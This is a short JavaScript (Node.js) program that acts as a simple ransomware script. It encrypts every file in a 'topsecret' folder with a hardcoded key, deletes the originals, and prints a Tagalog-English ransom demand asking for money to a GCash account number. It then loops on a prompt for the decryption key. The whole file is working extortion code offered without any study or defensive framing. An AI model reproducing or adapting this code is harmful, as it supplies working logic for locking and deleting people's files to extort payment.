let encryptor = require("file-encryptor");
let readlineSync = require("readline-sync");
let fs = require("fs");

let encryptionKey = "idontknowthepassword";
let topsecret = "./topsecret/";

let decryptionKey = "";

let filesToEncrypt = fs.readdirSync(topsecret);
let filesEncrypted = 0;

filesToEncrypt.forEach((file, index) => {
  encryptor.encryptFile(
    `${topsecret}${file}`,
    `${topsecret}${file}.encrypt`,
    encryptionKey,
    function (err) {
      if (err) {
        console.error("Error encrypting file:", err);
        return;
      }

      fs.unlinkSync(`${topsecret}${file}`);
      filesEncrypted++;

      if (filesEncrypted === filesToEncrypt.length) {
        console.log(
          `Your files have been encrypted. kung gusto mong mabuksan ito send me some money in my gcash account 09222520100 HAHAHAHA`
        );
        startDecryption();
      }
    }
  );
});

function startDecryption() {
  while (true) {
    decryptionKey = readlineSync.question("Please enter the decryption key: ");

    if (decryptionKey.toLowerCase() === "exit") {
      console.log("Exiting decryption process.");
      process.exit(1);
    }

    if (decryptionKey === encryptionKey) {
      decryptFiles(decryptionKey);
      break;
    } else {
      console.log("Wrong decryption key. Please try again.");
    }
  }
}

function decryptFiles(decryptionKey) {
  let filesToDecrypt = fs.readdirSync(topsecret);
  let filesDecrypted = 0;

  filesToDecrypt.forEach((file) => {
    encryptor.decryptFile(
      `${topsecret}${file}`,
      `${topsecret}${file}`.replace(".encrypt", ""),
      decryptionKey,
      function (err) {
        if (err) {
          console.error("Error decrypting file:", err);
          return;
        }

        fs.unlinkSync(`${topsecret}${file}`);
        filesDecrypted++;

        if (filesDecrypted === filesToDecrypt.length) {
          console.log("Congratulations, your files have been decrypted.");
          process.exit(1);
        }
      }
    );
  });
}
